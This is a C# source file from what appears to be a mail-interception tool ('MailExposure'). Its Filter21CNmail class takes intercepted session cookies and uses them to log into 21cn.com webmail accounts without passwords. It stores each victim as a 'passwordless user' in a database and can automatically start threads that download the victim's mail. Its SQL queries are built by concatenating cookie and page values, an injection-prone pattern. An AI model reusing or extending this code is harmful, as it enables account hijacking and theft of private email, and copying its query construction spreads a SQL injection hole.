using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading;
using System.Net;

namespace MailExposure.CookieMailRC
{
    class Filter21CNmail:DisplaceNew
    {
        // Fields
        private bool Auto;
        private string cookieRemarks;
        private string strCookie;
        private string urls;
        private string userListNames;
        private string UserName;

        // Methods
        public Filter21CNmail(string url, string strCookie, string interceptTime, string userList, bool Auto, string cookieRemarks)
        {
            this.urls = "";
            this.UserName = "";
            this.strCookie = "";
            this.userListNames = "";
            this.cookieRemarks = "";
            base.url = url;
            base.cookie = strCookie;
            this.strCookie = strCookie;
            base.interceptTime = interceptTime;
            this.userListNames = userList;
            this.Auto = Auto;
            this.cookieRemarks = cookieRemarks;

        }
        public void loginUser()
        {
            base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
            base.streamControl = true;
            base.MyStringBuilder = this.Request(base.url);
            if ((base.MyStringBuilder.ToString() != "") && (base.MyStringBuilder.ToString().IndexOf("@21cn.com") != -1))
            {
                string message = "";
                message = base.putstr(base.MyStringBuilder.ToString(), "gUser", ";", 0);
                this.UserName = base.putstr(message, "'", "'", 0);
            }
            else
            {
                this.UserName = base.putstr(this.strCookie, "ACCOUNT=", ";", 0);
            }
            if (((this.UserName != "") && (this.UserName != null)) && (this.UserName != "-1"))
            {
                string str2 = "'" + this.UserName + "'";
                string str3 = "'" + this.strCookie + "'";
                string str4 = "'cap21cn'";
                string str5 = "'21CNMail'";
                string str6 = "'" + base.interceptTime + "'";
                string usertype = "'无密用户'";
                string str8 = "'是'";
                if (this.cookieRemarks.Length > 0)
                {
                    str4 = "'" + this.cookieRemarks + "'";
                }
                else
                {
                    str4 = "'" + DateTime.Now.ToString("yyyMMdd") + "'";
                }
                string str9 = this.Auto ? "1" : "0";
                str9 = "'" + str9 + "'";
                this.userListNames = "'" + this.userListNames + "'";
                string strSql = "insert into users(属主,用户名,服务器,服务器地址,方向,邮件地址,验证登陆,时间限制,用户类型,全部接收,用户列表) values(" + str4 + "," + str2 + "," + str5 + "," + str5 + "," + str4 + ",'" + base.url + "'," + str3 + "," + str6 + "," + usertype + "," + str8 + "," + this.userListNames + ")";
                string str11 = "select count(*)from users where 服务器地址=" + str5 + "and 用户名=" + str2 + "and 用户类型=" + usertype;
                string str12 = "update users set 邮件地址='" + base.url + "',验证登陆=" + str3 + " where 服务器地址=" + str5 + "and 用户名=" + str2 + "and 用户类型=" + usertype;
                if (Convert.ToInt32(GlobalValue.mainForm.ExecuteSQL(str11)) <= 0)
                {
                    GlobalValue.mainForm.ExecuteSQL(strSql);
                    GlobalValue.mainForm.listBoxView.Items.Add("添加用户：" + this.UserName);
                    GlobalValue.mainForm.listBoxView.Items.Add("[" + this.UserName + "]: 结束过滤");
                    GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
                    if (this.Auto)
                    {
                        new BeginReceiveThreads(1, "21CNMAIL", "21cn", this.UserName, "", str4.Trim(new char[] { '\'' }), "21cn", 0, base.url, this.strCookie, usertype, this.userListNames.Trim(new char[] { '\'' })).Execute();
                    }
                }
                else
                {
                    str11 = "select 时间限制 from users where 服务器地址=" + str5 + "and 用户名=" + str2 + "and 用户类型=" + usertype;
                    DateTime time = DateTime.Parse(GlobalValue.mainForm.ExecuteSQL(str11));
                    if (DateTime.Compare(DateTime.Parse(base.interceptTime), time) > 0)
                    {
                        GlobalValue.mainForm.ExecuteSQL(str12);
                        GlobalValue.mainForm.listBoxView.Items.Add("[" + this.UserName + "]：修改用户！");
                        GlobalValue.mainForm.listBoxView.Items.Add("[" + this.UserName + "]: 结束过滤");
                        GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
                        if (this.Auto)
                        {
                            new BeginReceiveThreads(1, "21CNMAIL", "21cn", this.UserName, "", str4.Trim(new char[] { '\'' }), "cap21cn", 0, base.url, this.strCookie, usertype, this.userListNames.Trim(new char[] { '\'' })).Execute();
                        }
                    }
                }
            }
            else
            {
                GlobalValue.mainForm.listBoxView.Items.Add("Cookie 可能已失效");
                GlobalValue.mainForm.listBoxView.Items.Add("结束过滤");
                GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
            }

        }
        private StringBuilder Request(string url)
        {
            try
            {
                StreamReader reader;
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET";
                request.Accept = "*/*";
                request.AllowAutoRedirect = false;
                request.ServicePoint.Expect100Continue = false;
                request.KeepAlive = true;
                request.UserAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)";
                request.ContentType = "application/x-www-form-urlencoded";
                request.Headers.Add("Accept-Language: zh-cn");
                request.Headers.Add("Cookie", base.cookie);
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                WebHeaderCollection headers = response.Headers;
                if (response.Headers["Set-Cookie"] != null)
                {
                    base.cookie = base.cook(response.Headers["Set-Cookie"]);
                }
                if (headers["Content-Type"] != null)
                {
                    string str = "";
                    str = headers["Content-Type"];
                    if (str.IndexOf("charset=") >= 0)
                    {
                        base.charSet = str.Substring(str.IndexOf("charset=") + 8, (str.Length - str.IndexOf("charset=")) - 8);
                    }
                }
                Thread.Sleep(10);
                if (((response.StatusCode == HttpStatusCode.Found) || (response.StatusCode == HttpStatusCode.MovedPermanently)) || ((response.StatusCode == HttpStatusCode.MovedPermanently) || (response.StatusCode == HttpStatusCode.Found)))
                {
                    this.urls = headers["location"];
                    if (this.urls.IndexOf("http") != -1)
                    {
                        this.Request(this.urls);
                    }
                }
                if ((base.charSet == null) || (base.charSet == "-1"))
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.Default);
                }
                else
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(base.charSet));
                }
                if (base.streamControl)
                {
                    base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                    for (string str2 = reader.ReadLine(); str2 != null; str2 = reader.ReadLine())
                    {
                        base.MyStringBuilder.Append(str2 + "\r\n");
                        str2 = null;
                    }
                    base.streamControl = false;
                }
                reader.Close();
            }
            catch (Exception exception)
            {
                base.ShowMessage("163Request:" + exception.Message);
            }
            return base.MyStringBuilder;

        }

    }
}
